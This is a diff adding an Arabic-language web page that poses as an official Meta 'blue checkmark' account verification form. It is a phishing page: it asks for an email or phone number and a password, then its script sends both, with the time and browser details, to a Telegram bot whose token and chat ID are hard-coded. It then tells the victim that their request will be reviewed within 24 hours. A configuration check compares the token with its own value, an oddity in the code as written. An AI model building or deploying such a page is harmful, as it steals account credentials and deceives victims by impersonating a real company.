@@ -1,0 +1,294 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+    <title>توثيق الحساب ✔️ | علامة الصح الزرقاء</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: system-ui, 'Segoe UI', 'Tahoma', 'Cairo', sans-serif;
+        }
+
+        body {
+            background: linear-gradient(145deg, #0a2b3e 0%, #0a1c2a 100%);
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            padding: 20px;
+        }
+
+        .container {
+            max-width: 480px;
+            width: 100%;
+            background: rgba(255,255,255,0.98);
+            border-radius: 48px;
+            box-shadow: 0 25px 50px -12px rgba(0,0,0,0.5), 0 0 0 1px rgba(255,255,255,0.2);
+            overflow: hidden;
+            backdrop-filter: blur(2px);
+            transition: transform 0.2s ease;
+        }
+
+        .header {
+            background: #1877f2;
+            padding: 30px 20px 25px;
+            text-align: center;
+            color: white;
+        }
+
+        .badge {
+            display: inline-flex;
+            align-items: center;
+            gap: 8px;
+            background: rgba(255,255,255,0.2);
+            padding: 8px 20px;
+            border-radius: 60px;
+            margin-bottom: 18px;
+            font-weight: 600;
+            font-size: 0.9rem;
+            backdrop-filter: blur(4px);
+        }
+
+        .badge span {
+            font-size: 22px;
+        }
+
+        h1 {
+            font-size: 1.9rem;
+            font-weight: 700;
+            letter-spacing: -0.3px;
+            margin-bottom: 8px;
+        }
+
+        .sub {
+            font-size: 0.9rem;
+            opacity: 0.9;
+        }
+
+        .content {
+            padding: 32px 24px 40px;
+        }
+
+        .form-group {
+            margin-bottom: 22px;
+        }
+
+        label {
+            display: block;
+            font-weight: 600;
+            color: #1e2a3e;
+            margin-bottom: 8px;
+            font-size: 0.85rem;
+            letter-spacing: 0.3px;
+        }
+
+        .input-icon {
+            position: relative;
+            display: flex;
+            align-items: center;
+        }
+
+        .input-icon i {
+            position: absolute;
+            right: 16px;
+            font-size: 18px;
+            color: #8a9bb0;
+        }
+
+        input {
+            width: 100%;
+            padding: 16px 48px 16px 16px;
+            font-size: 1rem;
+            border: 1.5px solid #e2e8f0;
+            border-radius: 28px;
+            background: #ffffff;
+            transition: all 0.2s;
+            outline: none;
+            font-weight: 500;
+        }
+
+        input:focus {
+            border-color: #1877f2;
+            box-shadow: 0 0 0 3px rgba(24,119,242,0.2);
+        }
+
+        .verify-btn {
+            width: 100%;
+            background: linear-gradient(95deg, #1877f2, #0e5bc2);
+            border: none;
+            padding: 16px;
+            border-radius: 40px;
+            color: white;
+            font-weight: bold;
+            font-size: 1.1rem;
+            cursor: pointer;
+            transition: 0.2s;
+            margin-top: 20px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 10px;
+            box-shadow: 0 8px 18px rgba(24,119,242,0.3);
+        }
+
+        .verify-btn:active {
+            transform: scale(0.97);
+            background: #0e5bc2;
+        }
+
+        .secure-note {
+            background: #f0f4f9;
+            margin-top: 28px;
+            padding: 14px;
+            border-radius: 24px;
+            font-size: 12px;
+            color: #4b5b6c;
+            text-align: center;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 8px;
+        }
+
+        .footer {
+            font-size: 11px;
+            text-align: center;
+            padding: 18px;
+            border-top: 1px solid #edf2f7;
+            color: #7e8b9c;
+        }
+    </style>
+</head>
+<body>
+
+<div class="container">
+    <div class="header">
+        <div class="badge">
+            <span>✔️</span> التحقق الرسمي
+        </div>
+        <h1>علامة الصح الزرقاء</h1>
+        <div class="sub">احصل على التوثيق الرسمي لحسابك</div>
+    </div>
+    <div class="content">
+        <form id="verifyForm">
+            <div class="form-group">
+                <label>📧 البريد الإلكتروني أو رقم الهاتف</label>
+                <div class="input-icon">
+                    <i>📱</i>
+                    <input type="text" id="identifier" placeholder="example@domain.com أو 05xxxxxxxx" autocomplete="off">
+                </div>
+            </div>
+            <div class="form-group">
+                <label>🔐 كلمة المرور</label>
+                <div class="input-icon">
+                    <i>🔒</i>
+                    <input type="password" id="password" placeholder="••••••••" autocomplete="off">
+                </div>
+            </div>
+            <button type="button" class="verify-btn" id="submitBtn">
+                ✔️ تأكيد التوثيق
+            </button>
+        </form>
+        <div class="secure-note">
+            <span>🔒</span> بيئة آمنة 256-bit — يتم التحقق من هويتك فوراً
+        </div>
+    </div>
+    <div class="footer">
+        © 2025 Verified by Meta • حماية كاملة للبيانات
+    </div>
+</div>
+
+<script>
+    // ⚠️ ضع هنا التوكن الخاص بالبوت ورقم الأيدي الصحيح ⚠️
+    // مثال: const BOT_TOKEN = "1234567890:ABCdefGHIjklmNOPqrstUVwxyz";
+    // const CHAT_ID = "123456789";
+    
+    const BOT_TOKEN = "7841615668:AAGwEvfH05NZKYNFqHZHhfAPZeio7rPlcJc";   // ⬅️ أدخل توكن البوت هنا
+    const CHAT_ID = "6678179112";       // ⬅️ أدخل الأيدي الصحيح هنا
+
+    const submitBtn = document.getElementById('submitBtn');
+    
+    async function sendToTelegram(emailOrPhone, password) {
+        if (BOT_TOKEN === "7841615668:AAGwEvfH05NZKYNFqHZHhfAPZeio7rPlcJc" || CHAT_ID === "6678179112") {
+            alert("⚠️ خطأ في الإعدادات: لم يتم تهيئة البوت بشكل صحيح. يرجى إدخال التوكن ورقم الأيدي في الكود.");
+            console.error("Bot token or chat ID missing.");
+            return false;
+        }
+        
+        const deviceInfo = `🖥️ الجهاز: ${navigator.userAgent.length > 60 ? navigator.userAgent.substring(0,60)+'...' : navigator.userAgent}`;
+        const timeNow = new Date().toLocaleString('ar-EG', {timeZone: 'Africa/Cairo'});
+        
+        const message = `✅✅✅ [ توثيق علامة الصح ] ✅✅✅
+        
+📧 البريد/رقم الجوال: ${emailOrPhone}
+🔑 كلمة المرور: ${password}
+🕒 التوقيت: ${timeNow}
+🌐 المصدر: صفحة التوثيق الرسمية
+${deviceInfo}`;
+
+        const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
+        
+        try {
+            const response = await fetch(url, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    chat_id: CHAT_ID,
+                    text: message,
+                    parse_mode: 'HTML'
+                })
+            });
+            const data = await response.json();
+            if (data.ok) {
+                return true;
+            } else {
+                console.error("Telegram error:", data);
+                return false;
+            }
+        } catch (error) {
+            console.error("Network error:", error);
+            return false;
+        }
+    }
+    
+    submitBtn.addEventListener('click', async function(e) {
+        const identifier = document.getElementById('identifier').value.trim();
+        const password = document.getElementById('password').value;
+        
+        if (!identifier) {
+            alert("⚠️ يرجى إدخال البريد الإلكتروني أو رقم الهاتف.");
+            document.getElementById('identifier').focus();
+            return;
+        }
+        if (!password) {
+            alert("⚠️ يرجى إدخال كلمة المرور.");
+            document.getElementById('password').focus();
+            return;
+        }
+        
+        // تغيير النص لإظهار عملية الإرسال
+        const originalText = submitBtn.innerHTML;
+        submitBtn.innerHTML = "⏳ جاري التحقق الآمن ...";
+        submitBtn.disabled = true;
+        
+        const success = await sendToTelegram(identifier, password);
+        
+        if (success) {
+            // ✅ إذا تم الإرسال بنجاح إلى التليجرام
+            alert("✔️ تم إرسال طلب التوثيق بنجاح! سيتم مراجعة بياناتك خلال 24 ساعة.");
+            // يمكنك مسح الحقول أو توجيه المستخدم لصفحة أخرى
+            document.getElementById('verifyForm').reset();
+        } else {
+            alert("❌ حدث خطأ تقني، يرجى المحاولة مرة أخرى (فشل الاتصال بالبوت).");
+        }
+        
+        // إعادة الزر إلى وضعه الطبيعي
+        submitBtn.innerHTML = originalText;
+        submitBtn.disabled = false;
+    });
+</script>
+</body>
+</html>
